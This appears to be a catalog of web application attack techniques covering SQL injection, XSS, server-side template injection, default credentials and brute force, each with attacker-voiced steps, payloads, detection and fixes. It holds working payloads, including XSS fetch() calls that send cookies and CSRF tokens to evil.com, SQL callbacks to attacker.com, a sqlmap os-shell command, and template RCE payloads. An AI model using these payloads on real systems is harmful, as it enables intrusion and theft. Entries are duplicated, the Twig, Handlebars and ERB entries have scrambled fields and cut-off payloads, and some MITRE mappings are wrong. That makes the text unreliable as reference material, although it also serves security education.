# Web Application Security Attacks

## Union-based SQL Injection

- **Attack Type**: Injection via SQL UNION Operator
- **Target**: Web Applications
- **Vulnerability**: Input not sanitized before SQL execution
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Data leakage, credential theft
- **Tools**: Burp Suite, sqlmap, browser, proxy, Firefox
- **Scenario**: An attacker manipulates web app input fields to inject a malicious SQL UNION query that retrieves sensitive data from other database tables.
- **Attack Steps**: Step 1: Open the target web application in your browser and locate an input field that reflects user input in the URL (e.g., search, id=1). Step 2: Use a single quote (') to test if the field is vulnerable: modify the URL like https://example.com/page.php?id=1' and see if an SQL error is returned. Step 3: If an error appears (like "You have an error in your SQL syntax"), it indicates a possible SQL injection vulnerability. Step 4: Test the number of columns by appending ORDER BY clause: https://example.com/page.php?id=1 ORDER BY 1--, ORDER BY 2-- etc., until you get an error. The last number before the error shows how many columns exist. Step 5: Use the UNION SELECT statement to test output: try UNION SELECT 1,2,3-- replacing the number of columns from previous step. If the page reflects any numbers, you can inject data there. Step 6: Replace those numbers with database function calls like database(), version(), or table names: UNION SELECT database(), version(), user()--. Step 7: Enumerate table names using: UNION SELECT table_name, null, null FROM information_schema.tables WHERE table_schema=database()--. Step 8: Enumerate column names with: UNION SELECT column_name, null, null FROM information_schema.columns WHERE table_name='users'--. Step 9: Dump data using: UNION SELECT username, password, null FROM users--. Step 10: For automation, use sqlmap tool: sqlmap -u "https://example.com/page.php?id=1" --dbs to list databases. Step 11: Use further sqlmap options: --tables -D dbname, --columns -T tablename, --dump to extract all data. Step 12: Always analyze the response for clues (errors, page behavior) and extract info slowly to avoid WAF detection. Step 13: This attack works when server includes unsanitized input directly into SQL statements, and UNION allows merging multiple SELECTs. Step 14: A successful exploit may reveal usernames, passwords, emails, credit card data or internal tables.
- **Detection**: Web app firewall logs; anomalous DB queries; unusual error messages
- **Solution**: Use parameterized queries (e.g., prepared statements); validate and sanitize all user input
- **Tags**: SQLi, Web Hacking, Database Injection, OWASP Top 10

## Error-Based SQL Injection

- **Attack Type**: Triggering SQL Errors
- **Target**: Dynamic Web Forms
- **Vulnerability**: Verbose error messages in DB queries
- **MITRE**: T1190 – Exploit Public-Facing App
- **Impact**: Leak DB structure, user data, credentials
- **Tools**: Burp Suite, Browser Dev Tools
- **Scenario**: Attacker manipulates input to cause SQL errors that reveal backend database info in error messages.
- **Attack Steps**: Step 1: Find a web form (e.g., login, search) that sends input to the backend (e.g., GET /product.php?id=2). Step 2: Append a single quote (') to the input (e.g., id=2') and observe if the page throws a SQL error. Step 3: If error appears (e.g., "You have an error in your SQL syntax..."), it confirms vulnerability. Step 4: Start testing with UNION SELECT to retrieve additional data. For example, test with id=2 UNION SELECT NULL,NULL--. Step 5: Count how many columns exist by incrementing NULLs (e.g., NULL,NULL,NULL) until no error appears. Step 6: Replace NULLs with real values like database(), user(), version() to get DB details (e.g., id=2 UNION SELECT database(), user()--). Step 7: Extract table names using information_schema.tables, then column names. Step 8: Dump data using crafted UNION queries. Step 9: Exploit can be fully automated with tools like SQLmap.
- **Detection**: Monitor for SQL errors in responses; review logs showing quote or keyword injections
- **Solution**: Sanitize input using parameterized queries; disable detailed DB errors in production
- **Tags**: Error-Based SQLi, DB Enumeration

## Time-Based Blind SQL Injection

- **Attack Type**: Boolean Logic via Delays
- **Target**: Web Apps with Filtered Output
- **Vulnerability**: No SQL errors, no visible output
- **MITRE**: T1190 – Exploit Public-Facing App
- **Impact**: Stealthy DB dump via time inference
- **Tools**: Burp Suite, curl, SQLmap
- **Scenario**: No errors or outputs are shown, but response time reveals if injected query condition is true or false.
- **Attack Steps**: Step 1: Find an input field that interacts with backend DB but shows no visible error (e.g., search box or login). Step 2: Inject ' OR IF(1=1, SLEEP(5), 0)-- into a field (e.g., URL parameter) and measure the response time. Step 3: If response is delayed by ~5 seconds, it confirms that the injected logic executed. Step 4: Now test false conditions (e.g., ' OR IF(1=2, SLEEP(5), 0)--) to confirm that delay doesn’t happen when false. Step 5: Use this technique to extract data one character at a time, such as checking if the first letter of the DB name is 'a' using: ' OR IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--. Step 6: Automate character-by-character guessing using SQLmap with --technique=T or manually write a Python script with timing checks. Step 7: Iterate this logic to dump database names, table names, and values from key tables. Step 8: This is useful when error messages and content are suppressed but timing remains observable.
- **Detection**: Monitor response times and anomalies; alert on repeated delays in HTTP requests
- **Solution**: Use prepared statements; set timeouts on DB responses; block usage of SLEEP or BENCHMARK in inputs
- **Tags**: Blind SQLi, Time Delay, Inference Attack

## Boolean-Based Blind SQLi

- **Attack Type**: Logical Conditions to Infer Data
- **Target**: Web Apps with Clean Output
- **Vulnerability**: Suppressed errors but logic still executes
- **MITRE**: T1190 – Exploit Public-Facing App
- **Impact**: Data exfiltration via boolean logic
- **Tools**: Burp Suite, Browser Dev Tools
- **Scenario**: Input doesn’t show data or errors, but changes in page behavior reveal true/false logic evaluation.
- **Attack Steps**: Step 1: Identify an input field that affects backend SQL query (e.g., URL like product.php?id=1). Step 2: Modify input to a condition like id=1 AND 1=1 and id=1 AND 1=2. Step 3: Observe differences in page behavior: when true (1=1), page loads normally; when false (1=2), page returns blank, error, or different content. Step 4: Use this logic to extract data from DB character by character. Example: test id=1 AND SUBSTRING(database(),1,1)='a' and observe output. Step 5: Use binary search or iterate through characters to discover DB name, table names, column names. Step 6: Build full queries to extract sensitive data (e.g., SELECT password FROM users WHERE id=1). Step 7: You can automate this using SQLmap with --technique=B. Step 8: Detection is difficult because no errors are shown — only logical flow is altered. Step 9: Great technique for hardened apps that block errors and verbose output.
- **Detection**: Monitor for repeated conditional requests; pattern-match SUBSTRING or CHAR usage in SQL queries
- **Solution**: Input validation + whitelisting; use ORM; avoid direct SQL execution with raw input
- **Tags**: Boolean SQLi, Blind Injection, Logic Abuse

## Out-of-Band SQL Injection

- **Attack Type**: External Interaction-Based Exfil
- **Target**: DBMS with Outbound Access
- **Vulnerability**: DB triggers outbound DNS/HTTP requests
- **MITRE**: T1041 – Exfil via C2 Channel
- **Impact**: Full DB extraction via DNS/HTTP side channel
- **Tools**: SQLmap, Burp Collaborator, DNSBin
- **Scenario**: Attacker forces DB to send data to an external server they control, bypassing app’s output filtering.
- **Attack Steps**: Step 1: Attacker finds input that is used directly in SQL query but doesn’t reflect output or error in the browser. Step 2: Instead of extracting data via response, attacker uses DB functions like LOAD_FILE(), xp_dirtree, or UTL_HTTP.REQUEST() (depending on DBMS) to initiate external interaction. Step 3: For example, with MS-SQL, attacker sends: '; exec master..xp_dirtree '\\attacker.com\abc'--. If DBMS makes a DNS/SMB request to attacker.com, it proves code execution. Step 4: Use DNS logging tool (e.g., DNSBin or Burp Collaborator) to detect these callbacks. Step 5: Inject payloads to exfiltrate data (e.g., UNION SELECT password FROM users INTO OUTFILE '//attacker.com/data.txt'). Step 6: This works even if app doesn’t show SQL error/output as long as DB has outbound access. Step 7: SQLmap can automate this with --technique=U --os-shell --dns-domain=attacker.com. Step 8: Highly stealthy and dangerous on misconfigured DBs.
- **Detection**: Monitor DNS/SMB/HTTP traffic from DB servers; watch for strange domains
- **Solution**: Block outbound traffic from DB servers; disable risky functions like xp_cmdshell, UTL_HTTP
- **Tags**: OOB SQLi, DNS Exfiltration, Advanced Threat

## Error-Based SQL Injection

- **Attack Type**: Triggering SQL Errors
- **Target**: Dynamic Web Forms
- **Vulnerability**: Verbose error messages in DB queries
- **MITRE**: T1190 – Exploit Public-Facing App
- **Impact**: Leak DB structure, user data, credentials
- **Tools**: Burp Suite, Browser Dev Tools
- **Scenario**: Attacker manipulates input to cause SQL errors that reveal backend database info in error messages.
- **Attack Steps**: Step 1: Find a web form (e.g., login, search) that sends input to the backend (e.g., GET /product.php?id=2). Step 2: Append a single quote (') to the input (e.g., id=2') and observe if the page throws a SQL error. Step 3: If error appears (e.g., "You have an error in your SQL syntax..."), it confirms vulnerability. Step 4: Start testing with UNION SELECT to retrieve additional data. For example, test with id=2 UNION SELECT NULL,NULL--. Step 5: Count how many columns exist by incrementing NULLs (e.g., NULL,NULL,NULL) until no error appears. Step 6: Replace NULLs with real values like database(), user(), version() to get DB details (e.g., id=2 UNION SELECT database(), user()--). Step 7: Extract table names using information_schema.tables, then column names. Step 8: Dump data using crafted UNION queries. Step 9: Exploit can be fully automated with tools like SQLmap.
- **Detection**: Monitor for SQL errors in responses; review logs showing quote or keyword injections
- **Solution**: Sanitize input using parameterized queries; disable detailed DB errors in production
- **Tags**: Error-Based SQLi, DB Enumeration

## Time-Based Blind SQL Injection

- **Attack Type**: Boolean Logic via Delays
- **Target**: Web Apps with Filtered Output
- **Vulnerability**: No SQL errors, no visible output
- **MITRE**: T1190 – Exploit Public-Facing App
- **Impact**: Stealthy DB dump via time inference
- **Tools**: Burp Suite, curl, SQLmap
- **Scenario**: No errors or outputs are shown, but response time reveals if injected query condition is true or false.
- **Attack Steps**: Step 1: Find an input field that interacts with backend DB but shows no visible error (e.g., search box or login). Step 2: Inject ' OR IF(1=1, SLEEP(5), 0)-- into a field (e.g., URL parameter) and measure the response time. Step 3: If response is delayed by ~5 seconds, it confirms that the injected logic executed. Step 4: Now test false conditions (e.g., ' OR IF(1=2, SLEEP(5), 0)--) to confirm that delay doesn’t happen when false. Step 5: Use this technique to extract data one character at a time, such as checking if the first letter of the DB name is 'a' using: ' OR IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--. Step 6: Automate character-by-character guessing using SQLmap with --technique=T or manually write a Python script with timing checks. Step 7: Iterate this logic to dump database names, table names, and values from key tables. Step 8: This is useful when error messages and content are suppressed but timing remains observable.
- **Detection**: Monitor response times and anomalies; alert on repeated delays in HTTP requests
- **Solution**: Use prepared statements; set timeouts on DB responses; block usage of SLEEP or BENCHMARK in inputs
- **Tags**: Blind SQLi, Time Delay, Inference Attack

## Boolean-Based Blind SQLi

- **Attack Type**: Logical Conditions to Infer Data
- **Target**: Web Apps with Clean Output
- **Vulnerability**: Suppressed errors but logic still executes
- **MITRE**: T1190 – Exploit Public-Facing App
- **Impact**: Data exfiltration via boolean logic
- **Tools**: Burp Suite, Browser Dev Tools
- **Scenario**: Input doesn’t show data or errors, but changes in page behavior reveal true/false logic evaluation.
- **Attack Steps**: Step 1: Identify an input field that affects backend SQL query (e.g., URL like product.php?id=1). Step 2: Modify input to a condition like id=1 AND 1=1 and id=1 AND 1=2. Step 3: Observe differences in page behavior: when true (1=1), page loads normally; when false (1=2), page returns blank, error, or different content. Step 4: Use this logic to extract data from DB character by character. Example: test id=1 AND SUBSTRING(database(),1,1)='a' and observe output. Step 5: Use binary search or iterate through characters to discover DB name, table names, column names. Step 6: Build full queries to extract sensitive data (e.g., SELECT password FROM users WHERE id=1). Step 7: You can automate this using SQLmap with --technique=B. Step 8: Detection is difficult because no errors are shown — only logical flow is altered. Step 9: Great technique for hardened apps that block errors and verbose output.
- **Detection**: Monitor for repeated conditional requests; pattern-match SUBSTRING or CHAR usage in SQL queries
- **Solution**: Input validation + whitelisting; use ORM; avoid direct SQL execution with raw input
- **Tags**: Boolean SQLi, Blind Injection, Logic Abuse

## Out-of-Band SQL Injection

- **Attack Type**: External Interaction-Based Exfil
- **Target**: DBMS with Outbound Access
- **Vulnerability**: DB triggers outbound DNS/HTTP requests
- **MITRE**: T1041 – Exfil via C2 Channel
- **Impact**: Full DB extraction via DNS/HTTP side channel
- **Tools**: SQLmap, Burp Collaborator, DNSBin
- **Scenario**: Attacker forces DB to send data to an external server they control, bypassing app’s output filtering.
- **Attack Steps**: Step 1: Attacker finds input that is used directly in SQL query but doesn’t reflect output or error in the browser. Step 2: Instead of extracting data via response, attacker uses DB functions like LOAD_FILE(), xp_dirtree, or UTL_HTTP.REQUEST() (depending on DBMS) to initiate external interaction. Step 3: For example, with MS-SQL, attacker sends: '; exec master..xp_dirtree '\\attacker.com\abc'--. If DBMS makes a DNS/SMB request to attacker.com, it proves code execution. Step 4: Use DNS logging tool (e.g., DNSBin or Burp Collaborator) to detect these callbacks. Step 5: Inject payloads to exfiltrate data (e.g., UNION SELECT password FROM users INTO OUTFILE '//attacker.com/data.txt'). Step 6: This works even if app doesn’t show SQL error/output as long as DB has outbound access. Step 7: SQLmap can automate this with --technique=U --os-shell --dns-domain=attacker.com. Step 8: Highly stealthy and dangerous on misconfigured DBs.
- **Detection**: Monitor DNS/SMB/HTTP traffic from DB servers; watch for strange domains
- **Solution**: Block outbound traffic from DB servers; disable risky functions like xp_cmdshell, UTL_HTTP
- **Tags**: OOB SQLi, DNS Exfiltration, Advanced Threat

## Stored XSS

- **Attack Type**: Inject JS stored in DB → auto-executes
- **Target**: Dynamic Web Apps
- **Vulnerability**: Input saved without sanitization
- **MITRE**: T1059.007 – Cross-Site Scripting
- **Impact**: Credential theft, session hijacking
- **Tools**: Burp Suite, Firefox DevTools
- **Scenario**: JavaScript payloads stored in DB render automatically when viewed by users.
- **Attack Steps**: Step 1: Attacker finds an input field (e.g., comments, profile name, chat box) where the user input is saved and later displayed to other users. Step 2: Attacker inputs a malicious JavaScript payload such as <script>fetch('https://evil.com?cookie='+document.cookie)</script>. Step 3: This input is stored in the backend database. Step 4: When a victim or admin later views the page that renders this stored data, the malicious JS auto-executes. Step 5: The script may exfiltrate cookies, redirect to phishing pages, or alter UI. Step 6: Attacker can automate with multiple payloads targeting various pages or user roles. Step 7: The exploit is persistent and will trigger every time the page is viewed unless sanitized.
- **Detection**: Monitor DB-stored inputs; observe DOM-based JS injections
- **Solution**: Sanitize and encode stored user inputs on render
- **Tags**: Stored XSS, Persistent Attack

## Reflected XSS

- **Attack Type**: JS injected in URL/query reflected back
- **Target**: Web Pages with Echoed Input
- **Vulnerability**: Dynamic output without sanitization
- **MITRE**: T1059.007 – Cross-Site Scripting
- **Impact**: Session hijacking, phishing
- **Tools**: Burp Suite, OWASP ZAP
- **Scenario**: JavaScript payloads echoed immediately by server responses via URLs.
- **Attack Steps**: Step 1: Attacker identifies a URL parameter (e.g., search?q=test) that is reflected in the page's HTML without proper encoding. Step 2: Attacker crafts a malicious URL like https://example.com/search?q=<script>alert('XSS')</script>. Step 3: The victim clicks on this crafted link (often sent via email or DM). Step 4: The server reflects the input back into the HTML page without sanitizing, executing the script in the victim’s browser. Step 5: This leads to credential theft, redirection, or arbitrary JS execution. Step 6: It only triggers when the crafted link is visited — hence non-persistent. Step 7: Reflected XSS can also affect search results, error messages, or UI labels.
- **Detection**: Alert on suspicious URLs; use CSP headers
- **Solution**: Escape reflected inputs; use HTML and JS encoding
- **Tags**: Reflected XSS, URL Payload

## DOM-Based XSS

- **Attack Type**: JS injected into DOM via client-side logic
- **Target**: Single Page Apps (SPA)
- **Vulnerability**: Frontend DOM manipulation without filter
- **MITRE**: T1059.007 – Cross-Site Scripting
- **Impact**: Client-side compromise, stealth attack
- **Tools**: Browser DevTools, DOM XSS Scanner
- **Scenario**: Client-side JS directly manipulates the DOM using untrusted input.
- **Attack Steps**: Step 1: Attacker identifies DOM manipulation in JavaScript code that uses unsanitized data from sources like location.href, document.URL, or window.name. Step 2: Attacker crafts a URL such as https://example.com/#<img src=x onerror=alert('XSS')>. Step 3: Victim visits the URL, and frontend JS inserts window.location.hash directly into innerHTML or a similar sink. Step 4: Malicious code executes in the user’s browser. Step 5: Since this attack bypasses the server, server-side filters offer no protection. Step 6: DOM-based XSS is stealthy and often missed in basic testing. Step 7: Attackers can chain this with phishing for greater impact.
- **Detection**: Scan JS sinks and sources; analyze JavaScript logic
- **Solution**: Sanitize DOM inputs; use secure JS APIs (e.g., textContent)
- **Tags**: DOM XSS, JS Injection

## XSS for Cookie Theft

- **Attack Type**: Steal cookies via JS
- **Target**: Any browser-based application
- **Vulnerability**: No HttpOnly, vulnerable to JS access
- **MITRE**: T1539 – Steal Web Session Cookie
- **Impact**: Session hijacking, identity theft
- **Tools**: Burp Suite, Cookie Stealer Script
- **Scenario**: JavaScript accesses document.cookie and sends data to attacker.
- **Attack Steps**: Step 1: Attacker first performs any XSS variant (stored, reflected, DOM) to execute JavaScript in the victim's browser. Step 2: Injects payload like <script>fetch('https://evil.com/log?c='+document.cookie)</script> into the vulnerable page. Step 3: When the script executes, the victim’s browser sends the session cookie to attacker’s server (evil.com). Step 4: Attacker now uses the stolen cookie to impersonate the victim on the target app. Step 5: This leads to session hijacking, data theft, or privilege abuse. Step 6: May be combined with other exploits (e.g., CSRF, privilege escalation). Step 7: Cookie theft is especially dangerous if HttpOnly is not set on sensitive cookies.
- **Detection**: Monitor outbound connections; alert on cookie string in GET/POST
- **Solution**: Mark cookies as HttpOnly, use CSP and input validation
- **Tags**: Cookie Theft, Session Hijack

## Stored XSS

- **Attack Type**: Inject JS stored in DB → auto-executes
- **Target**: Dynamic Web Apps
- **Vulnerability**: Input saved without sanitization
- **MITRE**: T1059.007 – Cross-Site Scripting
- **Impact**: Credential theft, session hijacking
- **Tools**: Burp Suite, Firefox DevTools
- **Scenario**: JavaScript payloads stored in DB render automatically when viewed by users.
- **Attack Steps**: Step 1: Attacker finds an input field (e.g., comments, profile name, chat box) where the user input is saved and later displayed to other users. Step 2: Attacker inputs a malicious JavaScript payload such as <script>fetch('https://evil.com?cookie='+document.cookie)</script>. Step 3: This input is stored in the backend database. Step 4: When a victim or admin later views the page that renders this stored data, the malicious JS auto-executes. Step 5: The script may exfiltrate cookies, redirect to phishing pages, or alter UI. Step 6: Attacker can automate with multiple payloads targeting various pages or user roles. Step 7: The exploit is persistent and will trigger every time the page is viewed unless sanitized.
- **Detection**: Monitor DB-stored inputs; observe DOM-based JS injections
- **Solution**: Sanitize and encode stored user inputs on render
- **Tags**: Stored XSS, Persistent Attack

## Reflected XSS

- **Attack Type**: JS injected in URL/query reflected back
- **Target**: Web Pages with Echoed Input
- **Vulnerability**: Dynamic output without sanitization
- **MITRE**: T1059.007 – Cross-Site Scripting
- **Impact**: Session hijacking, phishing
- **Tools**: Burp Suite, OWASP ZAP
- **Scenario**: JavaScript payloads echoed immediately by server responses via URLs.
- **Attack Steps**: Step 1: Attacker identifies a URL parameter (e.g., search?q=test) that is reflected in the page's HTML without proper encoding. Step 2: Attacker crafts a malicious URL like https://example.com/search?q=<script>alert('XSS')</script>. Step 3: The victim clicks on this crafted link (often sent via email or DM). Step 4: The server reflects the input back into the HTML page without sanitizing, executing the script in the victim’s browser. Step 5: This leads to credential theft, redirection, or arbitrary JS execution. Step 6: It only triggers when the crafted link is visited — hence non-persistent. Step 7: Reflected XSS can also affect search results, error messages, or UI labels.
- **Detection**: Alert on suspicious URLs; use CSP headers
- **Solution**: Escape reflected inputs; use HTML and JS encoding
- **Tags**: Reflected XSS, URL Payload

## DOM-Based XSS

- **Attack Type**: JS injected into DOM via client-side logic
- **Target**: Single Page Apps (SPA)
- **Vulnerability**: Frontend DOM manipulation without filter
- **MITRE**: T1059.007 – Cross-Site Scripting
- **Impact**: Client-side compromise, stealth attack
- **Tools**: Browser DevTools, DOM XSS Scanner
- **Scenario**: Client-side JS directly manipulates the DOM using untrusted input.
- **Attack Steps**: Step 1: Attacker identifies DOM manipulation in JavaScript code that uses unsanitized data from sources like location.href, document.URL, or window.name. Step 2: Attacker crafts a URL such as https://example.com/#<img src=x onerror=alert('XSS')>. Step 3: Victim visits the URL, and frontend JS inserts window.location.hash directly into innerHTML or a similar sink. Step 4: Malicious code executes in the user’s browser. Step 5: Since this attack bypasses the server, server-side filters offer no protection. Step 6: DOM-based XSS is stealthy and often missed in basic testing. Step 7: Attackers can chain this with phishing for greater impact.
- **Detection**: Scan JS sinks and sources; analyze JavaScript logic
- **Solution**: Sanitize DOM inputs; use secure JS APIs (e.g., textContent)
- **Tags**: DOM XSS, JS Injection

## XSS for Cookie Theft

- **Attack Type**: Steal cookies via JS
- **Target**: Any browser-based application
- **Vulnerability**: No HttpOnly, vulnerable to JS access
- **MITRE**: T1539 – Steal Web Session Cookie
- **Impact**: Session hijacking, identity theft
- **Tools**: Burp Suite, Cookie Stealer Script
- **Scenario**: JavaScript accesses document.cookie and sends data to attacker.
- **Attack Steps**: Step 1: Attacker first performs any XSS variant (stored, reflected, DOM) to execute JavaScript in the victim's browser. Step 2: Injects payload like <script>fetch('https://evil.com/log?c='+document.cookie)</script> into the vulnerable page. Step 3: When the script executes, the victim’s browser sends the session cookie to attacker’s server (evil.com). Step 4: Attacker now uses the stolen cookie to impersonate the victim on the target app. Step 5: This leads to session hijacking, data theft, or privilege abuse. Step 6: May be combined with other exploits (e.g., CSRF, privilege escalation). Step 7: Cookie theft is especially dangerous if HttpOnly is not set on sensitive cookies.
- **Detection**: Monitor outbound connections; alert on cookie string in GET/POST
- **Solution**: Mark cookies as HttpOnly, use CSP and input validation
- **Tags**: Cookie Theft, Session Hijack

## XSS for CSRF Token Theft

- **Attack Type**: Read & exfil tokens to bypass CSRF protections
- **Target**: Forms with DOM-visible CSRF tokens
- **Vulnerability**: CSRF tokens not secured or hidden
- **MITRE**: T1557.003 – Input Capture
- **Impact**: CSRF bypass, unauthorized actions
- **Tools**: Burp Suite, JS Script Injector
- **Scenario**: Exploiting XSS to read and steal CSRF tokens stored in the DOM or hidden fields.
- **Attack Steps**: Step 1: Attacker identifies a page vulnerable to any XSS type that also contains a CSRF token in a form or embedded as a JavaScript variable. Step 2: Attacker injects a JavaScript payload like <script>fetch('https://evil.com?csrf='+document.querySelector('[name=csrf_token]').value)</script>. Step 3: When the page loads and the XSS executes, it accesses the CSRF token from the DOM. Step 4: The token is sent to the attacker's server via HTTP request. Step 5: Attacker uses this token to perform authenticated actions mimicking a legitimate user. Step 6: If token is reused or predictable, this can lead to CSRF without user interaction.
- **Detection**: Monitor outgoing requests for sensitive tokens
- **Solution**: Store CSRF in secure cookies (SameSite, HttpOnly) and validate token origin
- **Tags**: CSRF Token Theft, XSS Abuse

## Template Injection – Jinja2 (Python)

- **Attack Type**: Server-Side Template Injection (SSTI)
- **Target**: Python-based Web Apps
- **Vulnerability**: Untrusted input rendered in templates
- **MITRE**: T1505.003 – Server-Side Template Injection
- **Impact**: Remote code execution, full server compromise
- **Tools**: Burp Suite, Flask app, Firefox DevTools
- **Scenario**: Applications using Jinja2 templating in Python (e.g., Flask) may render user input directly, allowing attackers to execute server-side commands through template expressions.
- **Attack Steps**: Step 1: Attacker identifies a field (e.g., username field, error messages, search box) where input is reflected back in the rendered page and suspects the backend is using the Jinja2 template engine. Step 2: Attacker tests simple payloads like {{7*7}} in the input field. If the output page renders "49", it confirms SSTI (server-side template injection). Step 3: Attacker then escalates to sensitive expression payloads like {{ config.items() }} or {{''.__class__.__mro__[2].__subclasses__() }} to enumerate internal Python objects. Step 4: For remote code execution, attacker sends advanced payload like {{ self._TemplateReference__context.cycler.__init__.__globals__.os.system('id') }} to run OS-level commands. Step 5: The backend executes id, and attacker sees system response in rendered page (e.g., uid=1000). Step 6: Attacker now has a powerful RCE primitive to explore the system, read environment variables, or deploy malware. Step 7: Defender must patch immediately and sanitize template inputs.
- **Detection**: Log unusual template expressions; scan for {{ }} in inputs
- **Solution**: Avoid rendering raw user input in templates; use sandboxes like Jinja2's SandboxedEnvironment
- **Tags**: SSTI, Jinja2, Flask, RCE

## Template Injection – Twig (PHP)

- **Attack Type**: Server-Side Template Injection (SSTI)
- **Target**: bash` to exfiltrate data or compromise the system. Step 6: This vulnerability allows full backend control if exploited. Step 7: Defender should immediately block such payloads and audit template render logic.
- **Vulnerability**: PHP Web Applications
- **MITRE**: Untrusted user input passed to Twig
- **Impact**: T1505.003 – Server-Side Template Injection
- **Tools**: Burp Suite, Firefox DevTools, PHP app
- **Scenario**: Twig is a popular PHP templating engine. If an app renders unfiltered user input through Twig, it can lead to code execution or file read, exposing the entire server environment.
- **Attack Steps**: Step 1: Attacker finds an input field (e.g., feedback form, username display) that reflects user data in the response. Step 2: Attacker inputs a test payload like {{7*7}}. If “49” appears in the rendered HTML, Twig is likely used and the app is vulnerable. Step 3: To verify RCE, attacker tries {{ system('id') }} or {{ls}}. Step 4: If the server outputs command results (e.g., uid=33(www-data)), RCE is confirmed. Step 5: Attacker can now use commands like cat /etc/passwd or `curl attacker.com/file.sh
- **Detection**: Remote Code Execution, File Disclosure
- **Solution**: Monitor templates for {{ patterns; track PHP errors and logs
- **Tags**: Escape user input before rendering; don’t allow user-controlled strings in Twig directly

## Template Injection – Handlebars (Node.js)

- **Attack Type**: Client-Side Prototype Pollution
- **Target**: pop
- **Vulnerability**: }}{{pop}}. **Step 5:** This allows access to dangerous JavaScript object internals. **Step 6:** Attacker may inject or overwrite global variables, like changing proto` properties or poisoning object behaviors. Step 7: In some cases, this leads to logic bypass, data manipulation, or even RCE (if chained with unsafe eval). Step 8: Developers must use strict helpers and avoid dynamic object references in templates.
- **MITRE**: Node.js Web Applications
- **Impact**: Insecure rendering via Handlebars
- **Tools**: Chrome DevTools, Burp Suite
- **Scenario**: Handlebars is used in many Node.js apps for client-side or server-side rendering. Uncontrolled helpers or unsafe rendering of user input can lead to prototype pollution or logic manipulation in JavaScript.
- **Attack Steps**: Step 1: Attacker finds a web app using Handlebars for rendering (e.g., template-based dashboards or public views). Step 2: Attacker tests input fields or URL parameters by injecting {{7*7}} or {{this}}. Step 3: If the page renders the result or structure, Handlebars is confirmed. Step 4: Attacker then tries prototype pollution payloads like `{{#with "constructor"}}{{#with split as
- **Detection**: T1059.007 – JavaScript Execution
- **Solution**: Prototype pollution, logic manipulation
- **Tags**: Monitor rendered template anomalies; audit object behaviors

## Template Injection – ERB (Ruby)

- **Attack Type**: Server-Side Code Execution via ERB
- **Target**: bash') %>to gain remote shell access. **Step 6:** This gives attacker complete control of the server. **Step 7:** In production, apps should never useeval` or untrusted input in ERB. Step 8: Defender must sanitize inputs and avoid rendering raw parameters.
- **Vulnerability**: Ruby on Rails Apps
- **MITRE**: Raw input evaluated inside ERB
- **Impact**: T1059.004 – Dynamic Code Execution
- **Tools**: Burp Suite, Rails App Console
- **Scenario**: ERB is the default templating engine in Ruby on Rails. If raw user input is passed into ERB templates and evaluated, it can lead to full server-side code execution (RCE).
- **Attack Steps**: Step 1: Attacker identifies a Rails-based application using .erb views (common in forms, error messages, admin dashboards). Step 2: Attacker locates an input (e.g., name, email, message) that is rendered dynamically in an ERB template. Step 3: Attacker injects Ruby code using <%= id %> or <%= system('ls') %>. Step 4: If the page renders command output, like a user list or server name, the app is vulnerable to ERB injection. Step 5: Attacker escalates with payloads like `<%= system('curl attacker.com/sh
- **Detection**: Full server compromise, RCE
- **Solution**: Monitor templates with dynamic evals or system calls
- **Tags**: Escape input using Rails helpers (h()); avoid eval or render inline: methods

## SQL Injection in Login Fields

- **Attack Type**: SQL Injection (Authentication Bypass)
- **Target**: Web Login Pages
- **Vulnerability**: Improper Input Sanitization
- **MITRE**: T1190 – Exploit Public-Facing App
- **Impact**: Authentication Bypass, Unauthorized Access
- **Tools**: Browser (e.g., Chrome), Burp Suite (optional), Text Editor
- **Scenario**: The attacker exploits poorly sanitized login fields by injecting SQL code. This causes the backend to run unexpected queries, bypassing authentication and granting unauthorized access to admin/user panels.
- **Attack Steps**: Step 1: Open the login page of the web application you want to test. It typically asks for a username and password.Step 2: In the username field, enter any of the following common SQLi payloads:' OR '1'='1admin'--' OR 1=1 --' OR '1'='1' -- -Step 3: Leave the password field blank or enter anything (e.g., 1234).Step 4: Submit the form by clicking Login.Step 5: If the backend is vulnerable, it will run an SQL query similar to:SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';Since '1'='1' is always true, the query returns all rows, and the application logs you in without verifying real credentials.Step 6: If the app redirects you to a dashboard or admin page without valid login, the site is vulnerable.Step 7 (Optional): Use Burp Suite to intercept and modify the HTTP POST request, placing SQL payloads directly into the username field for more precision.Step 8 (Optional): Try more advanced payloads to bypass different SQL configurations, such as:admin' #, admin'/*, ' OR 1=1 LIMIT 1-- -Step 9: Document all successful attempts. Do not use this on websites without permission—it is illegal. Use only on test labs like DVWA, bWAPP, or PortSwigger Labs.Step 10: Congratulations! You've simulated an SQL Injection in login that bypasses authentication and shows how backend logic can be manipulated with unescaped input.
- **Detection**: Monitor login activity for unusual behavior like repeated ' OR 1=1 attempts, failed logins with SQL syntax, and long query strings
- **Solution**: Sanitize all inputs using prepared statements or ORM methods (e.g., cursor.execute("SELECT ... WHERE username = ?", [username]))
- **Tags**: SQLi, Authentication Bypass, Web App, OWASP Top 10

## Default / Weak Credentials

- **Attack Type**: Credential Stuffing / Default Login
- **Target**: Login Forms / Admin Panels
- **Vulnerability**: Hardcoded credentials, default credentials
- **MITRE**: T1078 – Valid Accounts
- **Impact**: Full system access with no real hacking effort
- **Tools**: Web browser, Burp Suite, Wordlists
- **Scenario**: Applications ship with weak or default credentials like admin:admin, guest:guest. Attackers try these to gain unauthorized access.
- **Attack Steps**: Step 1: Open the login page of a target web app. Step 2: Try logging in using default credential pairs such as admin:admin, admin:1234, guest:guest, user:user, or other known defaults (search CVEs or GitHub issues for common ones). Step 3: If successful, you're now logged in without any brute force or exploits. Step 4: Use tools like Burp Intruder or manually test known combinations from public wordlists (e.g., rockyou.txt). Step 5: Check if the app allows password change or privilege escalation once logged in. Use responsibly, only on systems you are allowed to test.
- **Detection**: Alert on use of known default usernames or logins without password change post-install
- **Solution**: Force password change on first login; remove default credentials; use strong password policies
- **Tags**: Default Password, Weak Credential, OWASP A07

## Missing Rate Limiting / Brute Force

- **Attack Type**: Brute Force
- **Target**: Login Page / API Auth
- **Vulnerability**: No lockout, no delay in login attempts
- **MITRE**: T1110 – Brute Force
- **Impact**: User account takeover through password guessing
- **Tools**: Hydra, Burp Suite, curl
- **Scenario**: Login forms without rate limiting or lockout mechanisms allow automated guessing of credentials using tools like Hydra or Burp.
